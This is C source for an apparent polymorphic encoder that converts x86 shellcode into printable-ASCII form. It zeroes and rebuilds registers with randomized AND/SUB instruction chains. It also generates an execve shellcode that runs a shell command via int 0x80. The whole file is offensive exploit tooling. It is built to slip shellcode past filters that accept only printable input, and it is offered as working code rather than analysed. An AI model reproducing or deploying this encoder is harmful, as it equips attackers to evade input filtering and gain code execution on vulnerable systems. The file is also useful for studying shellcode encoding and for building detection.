
void add_b(__u8 first[4], __u8 second[4], int i){
	bool f[7], s[7];
	int c,d=1;
	f[0]=_random();
	f[1]=!f[0];
	for(c=2;c<7;c++) 
		f[c]=_random();
	s[0]=!f[0];
	s[1]=!f[1];
	for(c=2;c<7;c++)
		s[c]=f[c] ? 0:_random();
	first[i]=0;
	for(c=6;c>=0;c--){
		first[i]+=(f[c]*d);
		d*=2;
	}
	second[i]=0;
	d=1;
	for(c=6;c>=0;c--){
		second[i]+=s[c]*d;
		d*=2;
	}
}

void cleax(char *str){
	__u8 primo[4], secondo[4];
	int j;
	for (j=0;j<4;j++) add_b(primo, secondo, j);
	sprintf(str,"%%%c%c%c%c%%%c%c%c%c", primo[0],primo[1],primo[2],primo[3],secondo[0],secondo[1],secondo[2],secondo[3]);
}

int test(__u8 f, __u8 s, int n, int j){
	int r=0;
	if ((0x20*n<=(f-s-j)+r*0x100)&&((f-s-j)+r*0x100<=0x7e*n)) return 0;
	else if((f-s-j)+r*0x100>0x7e*n) return -1;
	else{
		while((f-s-j)+(r++)*0x100<=0x7e*n)
			if ((0x20*n<=(f-s-j)+r*0x100)&&((f-s-j)+r*0x100<=0x7e*n)) return r;
		
	}
	return -1;
}


void subeax(char *str, __u8 start[4], __u8 end[4]){
	int js[4], s=1, sums[4], i, max, min;
	char tmp[16];
	unsigned int a,b;
	__u8 a1[4], a2[4];
	for (i=0,max=0;i<4;i++)
		if (start[i] != end [i])
			max++;
	if (!max)
		return;
	a=start[3]+start[2]*0x100;
	b=end[3]+end[2]*0x100;
	if (a+1==b) {
		strcat (str, "H");
		return;
	}
	if (a-1==b) {
		strcat (str, "@");
		return;
	}
	while(!(((js[3]=test(start[3], end[3], s, 0))>=0)&&((js[2]=test(start[2], end[2], s, js[3]))>=0)&&((js[1]=test(start[1], end[1], s, js[2]))>=0)&&((js[0]=test(start[0], end[0], s, js[1]))>=0))) 
		s++;
	sums[0] = start[3]-end[3]+js[3]*0x100;
	sums[1] = start[2]-end[2]-js[3]+js[2]*0x100;
	sums[2] = start[1]-end[1]-js[2]+js[1]*0x100;
	sums[3] = start[0]-end[0]-js[1]+js[0]*0x100;
	switch(s){
		case 1:
			sprintf(tmp, "-%c%c%c%c", sums[0], sums[1], sums[2], sums[3]);
			strcat(str, tmp);
			break;
		case 2:
			for(i=0;i<4;i++){
				max=sums[i]-0x20;
				min=sums[i]-0x7e;
				a1[i]=_rrand((max>0x7e) ? 0x7e:max, (min<0x20) ? 0x20:min);
			}
			sprintf(tmp, "-%c%c%c%c-%c%c%c%c", a1[0], a1[1], a1[2],a1[3],sums[0]-a1[0],sums[1]-a1[1],sums[2]-a1[2],sums[3]-a1[3]);
			strcat(str, tmp);
			break;
		case 3:
			for(i=0;i<4;i++){
				max=sums[i]-0x40;
				min=sums[i]-0xfc;
				a1[i]=_rrand((max>0x7e) ? 0x7e:max,(min<0x20) ? 0x20:min);
				
			}
			
			for(i=0;i<4;i++){
				max=sums[i]-0x20-a1[i];
				min=sums[i]-(0x7e)-a1[i];
				a2[i]=_rrand((max>0x7e) ? 0x7e:max,(min<0x20) ? 0x20:min);
			}
				
			sprintf(tmp, "-%c%c%c%c-%c%c%c%c-%c%c%c%c", a1[0], a1[1], a1[2],a1[3],a2[0], a2[1], a2[2],a2[3],sums[0]-a1[0]-a2[0],sums[1]-a1[1]-a2[1],sums[2]-a1[2]-a2[2],sums[3]-a1[3]-a2[3]);
			strcat(str, tmp);
			break;
		default:
			break;
	}
}


char *shc2polyascprint (__u8 *shellcode, int sh_len, int n, long long int s) {
	int i = 11, d, k, inc;
	unsigned long long us;
	char *shc = (char*) malloc (i), tmp [16];
	__u8 a [4] = {0x00,0x00,0x00,0x00}, b [4] = {0x00,0x00,0x00,0x00};
	tmp [0] = 0;
	cleax (shc);
	if (s!=0) {
		i += 2;
		us = (s>0) ? s:(unsigned long long int)s;
		a[3]=us%0x100;
		a[2]=((us-a[3])/0x100)%0x100;
		a[1]=(us-a[3]-a[2]*0x100)/0x10000;
		a[0]=((us-a[3]-a[2]*0x100-a[1]*0x10000)/0x1000000)%0x100;
		printf("%.02x %.02x %.02x %.02x\n", a[0],a[1],a[2],a[3]);
		subeax (tmp, a, b);
		i += strlen (tmp);
		i += 2;
		shc = (char*) realloc (shc, i);
		strcat (shc, "TX");
		strcat (shc, tmp);
		strcat (shc, "P\\");
		cleax(tmp);
		i+=11;
		shc = (char*) realloc (shc, i);
		strcat (shc, tmp);
	}
	for (d=sh_len-4;d>=0;d-=4) {
		for (k=0;k<4;k++)
			a[k] = b[k];
		for (k=0;k<4;k++)
			b [k] = shellcode [d+3-k];
		tmp [0]=0;
		subeax (tmp, a, b);
		i += strlen (tmp)+1;
		i += 1;
		shc = (char*) realloc (shc, i);
		strcat (shc, tmp);
		strcat (shc, "P");
	}
	switch (d) {
		case -1:
			for (k=0;k<4;k++)
				a[k] = b[k];
			b [0] = shellcode [2];
			b [1] = shellcode [1];
			b [2] = shellcode [0];
			b [3] = 0x90;
			tmp [0]=0;
			subeax (tmp, a, b);
			i += strlen (tmp)+1;
			i += 1;
			shc = (char*) realloc (shc, i);
			strcat (shc, tmp);
			strcat (shc, "P");
			break;
		case -2:
			for (k=0;k<4;k++)
				a[k] = b[k];
			b [0] = shellcode [1];
			b [1] = shellcode [0];
			b [2] = 0x90;
			b [3] = 0x90;
			tmp [0]=0;
			subeax (tmp, a, b);
			i += strlen (tmp)+1;
			i += 1;
			shc = (char*) realloc (shc, i);
			strcat (shc, tmp);
			strcat (shc, "P");
			break;
		case -3:
			for (k=0;k<4;k++)
				a[k] = b[k];
			b [0] = shellcode [0];
			b [1] = 0x90;
			b [2] = 0x90;
			b [3] = 0x90;
			tmp [0]=0;
			subeax (tmp, a, b);
			i += strlen (tmp)+1;
			i += 1;
			shc = (char*) realloc (shc, i);
			strcat (shc, tmp);
			strcat (shc, "P");
			break;
		default:
			break;
	}
	if(n){
		if(d>-4) n+=d;
		for (k=0;k<4;k++)
			a[k] = b[k];
		for (k=0;k<4;k++)
			b[k] = 0x90;
		tmp [0]=0;
		subeax (tmp, a, b);
		i += strlen (tmp)+1;
		shc = (char*) realloc (shc, i);
		strcat (shc, tmp);
		inc = (n%4==0) ? (n/4):((n-(n%4)+4)/4); //melius abundare quam deficere
		i += inc+1;
		shc = (char*) realloc (shc, i);
		for(k=0;k<inc;k++)
			strcat (shc, "P");
	}
	return shc;
}

char* polyasc_gen(char *cmd, char *shell, bool setreuid,long long int s, int j){
	__u8 a[4]={0x00, 0x00, 0x00, 0x00}, b[4] = {0x00, 0x00, 0x00, 0x00};
	char def_shell[8]=DEF_PATH;
	char sh1[10] =
			"T"		//push	%esp
			"Z"		//pop	%edx
			"P"		//push	%eax
			"fh-c"		//pushw	$0x632d
			"T"		//push	%esp
			"Y";		//pop	%ecx
	char sh2[11]  =
			"T"		//push	%esp
			"["		//pop	%ebx
			"P"		//push	%eax
			"R"		//push	%edx
			"Q"		//push	%ecx
			"S"		//push	%ebx
			"T"		//push	%esp
			"Y"		//pop	%ecx
			"P"		//push	%eax
			"Z";		//pop	%edx
	int len=62+pushlen(strlen(shell ? shell:def_shell))+pushlen(strlen(cmd))+(s ? 14:0), i=10;
	char *shellcode = (char *)malloc(len*sizeof(char)), tmp[16],r[2]={(char)_rrand(0x7e,0x20), 0},jump[2];
	unsigned long long int us;
	if((j<0x20)||(j>0x7e)){
		printf("The jump number must be ascii printable\n");
		return NULL;
	}
	if(setreuid){
		printf("Not implemented yet\n");
		return NULL;
	}
	memset(shellcode, 0x00, len);
	cleax(shellcode);
	if (s!=0) {
		us = (s>0) ? s:(unsigned long long int)s;
		a[3]=us%0x100;
		a[2]=((us-a[3])/0x100)%0x100;
		a[1]=(us-a[3]-a[2]*0x100)/0x10000;
		a[0]=((us-a[3]-a[2]*0x100-a[1]*0x10000)/0x1000000)%0x100;
		tmp[0]=0;
		subeax (tmp, a, b);
		len += strlen (tmp);
		i+=14+strlen(tmp);
		shellcode = (char*) realloc (shellcode, len);
		strcat (shellcode, "TX");
		strcat (shellcode, tmp);
		strcat (shellcode, "P\\");
		cleax(tmp);
		shellcode = (char*) realloc (shellcode, len+10);
		strcat (shellcode, tmp);
	}
	appcode(cmd, (__u8*) shellcode+i);
	strcat(shellcode, sh1);
	appcode(shell ? shell:def_shell, shellcode+i+9+pushlen(strlen(cmd)));
	strcat(shellcode, sh2);
	for(i=0;i<4;i++)
		a[i]=0x00;
	b[0]=0x80;
	b[1]=0xcd;
	b[2]=0x0b;
	b[3]=0xb0;
	subeax(shellcode, a, b);
	strcat(shellcode, "P");
	tmp[0]=0;
	cleax(tmp);
	strcat(shellcode, tmp);
	strcat(shellcode, "4");
	strcat(shellcode, r);
	strcat(shellcode, "<");
	strcat(shellcode, r);
	strcat(shellcode, "t");
	jump[0]=(char)j;
	jump[1]=0;
	strcat(shellcode, jump);
	return shellcode;
}

